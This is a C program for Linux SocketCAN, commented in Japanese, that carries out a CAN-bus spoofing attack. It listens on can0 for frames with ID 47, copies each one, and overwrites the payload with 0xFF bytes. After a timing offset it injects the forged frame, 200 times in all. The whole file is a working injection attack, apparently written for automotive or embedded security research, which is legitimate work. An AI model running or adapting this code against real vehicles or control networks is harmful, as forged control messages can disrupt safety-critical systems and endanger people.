#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/sockios.h>
#include <linux/can/raw.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <time.h>

#define TARGET_CAN_ID 47  // 受信したい特定のCAN IDに置き換える
#define Reception_Interval 20000  //受信間隔

int main(void) {
    int s;  //socket
    int ret;
    int count = 0;
    fd_set rdfs;  //ファイルディスクリプタ
    struct sockaddr_can addr;  //CANインタフェースとソケットのbindに使用
    struct ifreq ifr;  //CANインタフェース
    struct can_frame frame;  //受信したCANの保持
    struct timeval tv;  //受信時間

    // CANソケットの作成
    s = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    if (s < 0) {
        perror("socket");
        return EXIT_FAILURE;
    }

    // CANインタフェースへのバインド
    memset(&ifr.ifr_name, 0, sizeof(ifr.ifr_name));
    strcpy(ifr.ifr_name, "can0");
    ioctl(s, SIOCGIFINDEX, &ifr);

    addr.can_family = AF_CAN;
    addr.can_ifindex = ifr.ifr_ifindex;

    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        return EXIT_FAILURE;
    }

    printf("Socket bound to CAN interface\n");

    //受信ループ
    while(1) {
        ssize_t nbytes;

        //CANフレーム受信
        nbytes = recv(s, &frame, sizeof(struct can_frame), 0);
        if (nbytes < 0) {
            perror("recv");
            return EXIT_FAILURE;
        }

        // 特定のCAN IDを持つフレームのみ処理
        if (frame.can_id == TARGET_CAN_ID) {
            // 受信時の時間を取得、取得後に受信ループから抜ける
            if (ioctl(s, SIOCGSTAMP, &tv) == -1) {
                perror("ioctl");
                return EXIT_FAILURE;
            }
            printf("%ld.%06ld にCAN ID %d を受信\n", tv.tv_sec, tv.tv_usec, frame.can_id);
            
            //ペイロードを最大値にする
            memset(frame.data, 0xFF, sizeof(frame.data));

            //タイミングをずらすために周期の半分sleepさせる
            struct timespec req = {0, (Reception_Interval/4) * 1000};
            nanosleep(&req, NULL);

            //なりすましを送信する
            write(s, &frame, sizeof(struct can_frame)) != sizeof(struct can_frame);

            count++;
        }
        if(count == 200) {
            break;
        }
    }
    return EXIT_SUCCESS;
}
